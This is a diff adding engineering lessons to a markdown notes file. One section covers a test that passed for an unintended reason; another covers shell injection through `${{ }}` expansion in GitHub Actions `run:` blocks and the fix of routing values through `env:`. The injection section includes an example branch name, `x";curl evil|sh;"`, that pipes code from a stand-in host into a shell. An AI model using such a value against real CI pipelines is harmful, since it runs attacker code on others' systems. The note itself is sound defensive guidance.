@@ -230,3 +230,33 @@ turn because the trigger cannot tell prose from code.
 
 Worth internalising when wiring any paid check into CI: the cost is not per PR, it is per push, and
 an agent that iterates diligently is the worst case. Gate on what the check can actually act on.
+
+## A test can pass for a reason you did not write
+
+`pathsMentioned` filtered URLs with `/^https?:/` and `path.includes("://")`. Both were **unreachable**
+— the capture group was `[\w.-]` and `/`, which cannot contain a colon. The "ignores URLs" test
+passed anyway, because the regex's *leading boundary class* refused to start a match at `//docs…`.
+
+So one mechanism was quietly doing two jobs and the test proved neither. That mattered, because the
+boundary class was also the bug: it omitted `*`, so bold paths — the most common citation form —
+were silently missed. Widening it to fix that would have started leaking URLs through a guard that
+looked like it handled them.
+
+**When a test passes, know which line made it pass.** A guard that has never executed is not a
+guard, and it hides the real mechanism from the next person to change it — including from the tests
+that are supposed to protect it.
+
+## `${{ }}` in a `run:` block is string substitution, not a variable
+
+GitHub Actions expands `${{ }}` into the script text *before* bash parses it. So
+`--branch=${{ github.head_ref }}` with a branch named `x";curl evil|sh;"` executes the curl.
+
+`github.head_ref`, PR titles and PR bodies are all attacker-controlled on a fork pull request, and
+this repo is public with an external-contributor flow — a live surface, not a theoretical one.
+
+**Pass them through `env:` and quote them.** There the value reaches bash as data and never becomes
+part of the script.
+
+The test for this must parse the YAML rather than slice the text: an `env:` block sits directly
+above the `run:` it feeds, so any text-splitting heuristic sees them as one chunk and flags the safe
+form as unsafe. `step.run` is exactly the shell that executes and nothing else.
